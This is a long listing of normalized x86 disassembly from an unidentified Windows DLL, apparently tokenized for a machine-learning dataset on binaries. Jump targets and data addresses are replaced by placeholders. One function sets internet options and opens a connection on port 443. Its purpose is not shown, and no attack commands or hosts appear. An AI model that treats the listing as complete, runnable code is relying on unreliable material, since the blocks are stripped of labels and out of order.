mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x14f
call sub_1001bb80
mov ebx [ ebp - 0xdc ]
mov [ ebp - 0xd8 ] 0x3
jmp r-xdata
mov ecx [ ebp - 0xdc ]
lea esi [ ebp - 0x104 ]
call sub_10007340
mov esi [ eax ]
lea edi [ ebp - 0x104 ]
call sub_10014890
mov eax [ ebp - 0xe0 ]
push esi
call sub_10068440
mov ebx [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
push esi
call edi
test eax eax
je r-xdata
sub eax 0x2
jne r-xdata
lea esi [ ebp - 0xf8 ]
mov ecx ebx
call sub_10007340
mov ebx [ eax ]
mov eax [ ebp - 0xe0 ]
call sub_10022f10
lea edi [ ebp - 0xf8 ]
mov esi eax
call sub_10014890
test esi esi
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x9e
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x57
call sub_1001bb80
lea edx [ ebp - 0x9c ]
mov eax 0x117
mov [ ebp - 0xd8 ] 0x2
lea esi [ ebp - 0xf8 ]
mov ecx ebx
call sub_10007340
mov ebx [ eax ]
mov eax [ ebp - 0xe0 ]
call sub_10022f10
lea edi [ ebp - 0xf8 ]
mov esi eax
call sub_10014890
test esi esi
je r-xdata
mov ebx [ ebp - 0xdc ]
mov [ ebp - 0xd8 ] 0x4
jmp r-xdata
mov ecx [ ebp - 0xdc ]
lea esi [ ebp - 0xf0 ]
call sub_10007340
mov esi [ eax ]
lea edi [ ebp - 0xf0 ]
call sub_10014890
mov eax [ ebp - 0xe0 ]
push esi
push eax
call sub_10059400
mov ebx [ ebp - 0xdc ]
jmp r-xdata
lea edi [ ebp - 0xf0 ]
call sub_10065690
test esi esi
jne r-xdata
mov ecx [ ebp - 0xdc ]
lea esi [ ebp - 0xf0 ]
call sub_10007340
mov esi [ eax ]
lea edi [ ebp - 0xf0 ]
call sub_10014890
mov eax [ ebp - 0xe0 ]
mov ecx esi
call sub_1001bcc0
mov ebx [ ebp - 0xdc ]
jmp r-xdata
sub_10069589
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_1002788e
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_10078ac0
inc eax
push eax
push edi
push esi
call sub_10077d10
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_1006963c
push 0x4c
mov eax sub_1007ee90
call sub_10007703
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x58 ] ebx
call sub_10022155
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_1005e05a
xor esi esi
add esp 0xc
movzx ebx ax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000fa70
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] bx
jb r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_1004dbe5
mov eax ebx
call sub_10019c00
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10050f80
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
movzx eax [ eax ]
lea ecx [ ebx + 0x9 ]
cmp ecx eax
jge r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
mov al [ eax + esi * 2 ]
sub al bl
add al 0x30
movzx eax al
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10050f80
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_1001905b
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov ebx [ ebp - 0x58 ]
sub_10069790
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x24 ]
lea eax [ edi + 0x8 ]
push eax
push 0x17
xor ebx ebx
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
mov [ ebp - 0x4 ] ecx
call sub_1001b974
mov esi [ ebp + 0x20 ]
add esp 0x18
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
lea ecx [ ebp + 0xc ]
call sub_10017b01
lea eax [ edi + 0x4 ]
push eax
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1001b974
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10017b01
push edi
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1001b974
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_10069850
push ebp
mov ebp esp
push 0xffffffff
push sub_1007deec
mov eax [ fs : 0x0 ]
push eax
sub esp 0x100
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
xor ebx ebx
push ebx
push ebx
push 0x2a
push ebx
mov [ ebp - 0x104 ] eax
mov [ ebp - 0xf0 ] ecx
mov [ ebp - 0x100 ] edx
call [ InternetSetOptionW@IAT ]
mov eax [ ebp + 0x14 ]
mov [ rw-data ] eax
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push 0xb
call sub_1002a3e0
lea eax [ ebp - 0x3c ]
add esp 0x8
mov [ ebp - 0xd0 ] 0xf
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0xe4 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push 0xa5
call sub_10062fc5
mov esi [ ebp + 0x18 ]
mov edi eax
mov ecx 0x29
[ edi ] [ esi ]
push 0xdc
mov [ ebp - 0xec ] eax
movsb [ edi ] [ esi ]
call sub_10062fc5
mov esi eax
mov eax [ ebp - 0xec ]
add esp 0x8
xor edi edi
mov [ ebp - 0xe8 ] eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ ebp - 0x3c ]
push edx
lea ecx [ ebp - 0xe4 ]
call sub_1005d090
push 0x4
mov [ ebp - 0x4 ] ebx
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0xfc ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xe8 ]
mov cx [ eax ]
mov [ esi ] cx
mov dl [ eax + 0x2 ]
mov [ esi + 0x2 ] dl
mov cl [ edi + rw-data ]
mov eax [ esi ]
push ebx
lea edx [ ebp - 0xf8 ]
and eax 0xffffff
mov [ ebp - 0xf4 ] cl
push edx
mov ecx rw-data
mov [ ebp - 0xf8 ] eax
call sub_10011860
push eax
lea eax [ ebp - 0x10c ]
push eax
mov ecx rw-data
call sub_100278a0
add [ ebp - 0xe8 ] 0x3
inc edi
add esi 0x4
cmp edi 0x37
jl r-xdata
xor esi esi
push ebx
push ebx
push ebx
push ebx
push 0x1
push ebx
mov ecx eax
call sub_1000dd00
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0xe4 ]
push ecx
lea edx [ ebp - 0x74 ]
push edx
call sub_10023480
add esp 0x8
cmp [ ebp - 0x60 ] 0x8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
jae r-xdata
cmp [ ebp - 0xd0 ] 0x10
mov [ ebp - 0x4 ] bl
cmp esi ebx
jne r-xdata
push ebx
push ebx
push 0x1bb
push ebx
push eax
mov ecx esi
call sub_1002e160
mov edi eax
mov [ ebp - 0xfc ] edi
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
mov eax r--data
jmp r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call sub_10065045
add esp 0x4
mov esi [ ebp - 0xf0 ]
mov eax esi
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp [ ebp - 0x60 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_1005d090
lea eax [ ebp - 0x58 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_100172f0
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
xor ecx ecx
cmp [ ebp - 0xd0 ] 0x10
mov [ ebp - 0x60 ] 0x7
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] cx
jb r-xdata
mov eax [ ebp - 0x74 ]
push eax
call sub_10065045
add esp 0x4
mov esi [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x58 ]
push ecx
call sub_10065045
add esp 0x4
mov edx [ ebp - 0xe4 ]
push edx
call sub_10065045
add esp 0x4
mov eax r--data
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_1005d090
lea edx [ ebp - 0x58 ]
push edx
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_100172f0
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov esi [ ebp - 0x104 ]
lea ecx [ ebp - 0xe8 ]
push ecx
push 0x7
call sub_1002a3e0
mov eax esi
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x58 ]
push eax
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_1005d090
lea edx [ ebp - 0x58 ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0x90 ]
push ecx
mov [ ebp - 0x4 ] 0x5
call sub_10025a80
add esp 0xc
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x7
jb r-xdata
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
cmp [ rw-data ] ebx
je r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_10065045
add esp 0x4
push ebx
push r--data
mov ecx rw-data
call sub_1005d090
lea ecx [ ebp - 0x90 ]
push ecx
lea edx [ ebp - 0xac ]
push edx
mov [ ebp - 0x10c ] r--data
mov [ ebp - 0x108 ] ebx
call sub_10023480
add esp 0x8
mov esi 0x8
mov [ ebp - 0x4 ] 0x9
cmp [ eax + 0x14 ] esi
jb r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0x6
call sub_1002a3e0
push rw-data
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebp - 0xac ]
push edx
call sub_10051900
add esp 0x14
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x8
call sub_10040f60
cmp [ ebp - 0x98 ] 0x10
mov [ ebp - 0x4 ] 0x7
jb r-xdata
push 0xa00000
push r--data
lea ecx [ ebp - 0x10c ]
push ecx
push 0x1
push ebx
push eax
push 0x1
mov ecx edi
call sub_10049f70
push eax
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0xf4 ] ebx
call sub_1005fa40
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x98 ] esi
jb r-xdata
mov eax [ eax ]
mov eax [ ebp - 0xac ]
push eax
call sub_10065045
add esp 0x4
mov esi [ ebp - 0xf8 ]
xor eax eax
mov edi 0x7
mov [ ebp - 0x98 ] edi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] ax
cmp esi ebx
je r-xdata
mov edx [ ebp - 0xac ]
push edx
call sub_10065045
add esp 0x4
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
push ebx
push ebx
mov ecx esi
call sub_10068b00
test eax eax
je r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
lea ecx [ ebp - 0xec ]
push ecx
lea edx [ ebp - 0xf0 ]
push edx
mov ecx esi
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xec ] ebx
call sub_100603f0
cmp [ ebp - 0xec ] ebx
je r-xdata
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_100683b0
lea ecx [ ebp - 0x1c ]
push ecx
push 0x5
mov edi eax
call sub_1002a3e0
sub esp 0x10
mov esi esp
lea eax [ ebp - 0x1c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x100 ] esp
mov [ esi ] bl
lea ecx [ eax + 0x1 ]
xor eax eax
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_10065045
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax ecx
push eax
lea edx [ ebp - 0x1c ]
push edx
mov ecx esi
call sub_1005d090
mov eax [ edi + 0x4 ]
push 0x26
push eax
call sub_1006bd10
mov ecx [ edi + 0x4 ]
push ecx
call sub_1006bab0
mov esi [ ebp - 0xf4 ]
add esp 0x28
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_10065045
add esp 0x4
mov eax r--data
jmp r-xdata
xor edx edx
cmp [ ebp - 0xd0 ] esi
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] dx
jmp r-xdata
mov ecx [ ebp - 0x74 ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
cmp [ ebp - 0x7c ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
jb r-xdata
xor eax eax
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_10065045
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
cmp [ rw-data ] ebx
je r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_10065045
add esp 0x4
mov eax r--data
jmp r-xdata
push edi
push r--data
call sub_10028d10
add esp 0x8
push ebx
push r--data
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0xb4 ] 0xf
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] bl
call sub_1005d090
mov esi [ rw-data ]
mov [ ebp - 0x4 ] 0xc
cmp esi [ rw-data ]
je r-xdata
mov edi [ ebp - 0xfc ]
jmp r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov esi [ ebp - 0xb8 ]
inc esi
push esi
call sub_10056814
push esi
mov edi eax
push ebx
push edi
call sub_10078970
mov eax [ ebp - 0xc8 ]
mov esi 0x10
add esp 0x10
cmp [ ebp - 0xb4 ] esi
jae r-xdata
lea edx [ ebp - 0xf0 ]
push edx
push 0x8
mov edi 0x10
call sub_1002a3e0
lea eax [ ebp - 0xf0 ]
add esp 0x8
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0xb8 ]
push ecx
push eax
push edi
call sub_10078600
add esp 0xc
cmp [ ebp - 0xb4 ] esi
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebx
lea eax [ ebp - 0xf0 ]
push eax
mov ecx esi
call sub_1001a9f0
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0xb4 ] 0xf
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] bl
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ esi + 0x10 ]
lea edx [ ecx - 0x1 ]
cmp eax edx
jne r-xdata
mov eax [ esi + 0x10 ]
dec eax
push eax
push 0x1
lea ecx [ ebp - 0x90 ]
push ecx
mov ecx esi
call sub_1003cd20
lea edx [ ebp - 0xec ]
push edx
push 0xd
mov [ ebp - 0x4 ] 0xd
call sub_1002a3e0
lea eax [ ebp - 0xec ]
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edi [ eax + 0x1 ]
xor ecx ecx
mov [ ebp - 0x60 ] 0x7
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] cx
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov eax [ ebp - 0x74 ]
push eax
call sub_10065045
add esp 0x4
lea eax [ ebp - 0xe8 ]
push eax
push 0x1
call sub_1002a3e0
lea eax [ ebp - 0xe8 ]
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
dec ecx
push ecx
push ebx
lea eax [ ebp - 0xac ]
push eax
mov ecx esi
call sub_1003cd20
push 0xffffffff
push ebx
lea ecx [ ebp - 0xac ]
push ecx
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x10
call sub_10040f60
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x98 ] edi
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
lea eax [ ebp - 0xec ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_1005d090
lea ecx [ ebp - 0x58 ]
push ecx
lea edx [ ebp - 0x90 ]
push edx
lea eax [ ebp - 0xac ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_10053a10
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0xf
call sub_10040f60
cmp [ ebp - 0x98 ] 0x10
jb r-xdata
mov eax edi
mov edx [ ebp - 0xe4 ]
push edx
call sub_10065045
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0xe8 ]
push ecx
lea ecx [ ebp - 0x58 ]
call sub_1005d090
mov [ ebp - 0x4 ] 0x11
cmp [ esi + 0x14 ] edi
jb r-xdata
add esi 0x1c
cmp esi [ rw-data ]
jne r-xdata
mov edx [ ebp - 0xac ]
jmp r-xdata
mov edi 0x10
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] bl
cmp [ ebp - 0x44 ] edi
jb r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_10065045
add esp 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edx
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x7c ] edi
jb r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] bl
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x44 ] edi
jb r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_10065045
add esp 0x4
lea edx [ ebp - 0x58 ]
push edx
push eax
lea eax [ ebp - 0xac ]
push eax
call sub_10025a80
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x12
call sub_10040f60
cmp [ ebp - 0x98 ] edi
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
jmp r-xdata
mov edx [ ebp - 0x58 ]
call sub_10065045
add esp 0x4
sub_1006a2ea
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000942f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1006a30b
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10030300
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
pop ebp
retn
sub_1006a380
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push r--data
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] 0x0
call sub_10062090
lea eax [ ebp - 0x10 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
add esp 0x8
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call sub_1005d090
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1006a3e7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_10039d39
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1006a40d
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_10020a90
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_1006a460
push 0x3
call sub_1002fcb8
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1005e59c
push 0xff
call sub_1005e59c
pop ecx
pop ecx
push 0x3
call sub_1002fcb8
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1006a499
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10054b6f
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1001905b
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
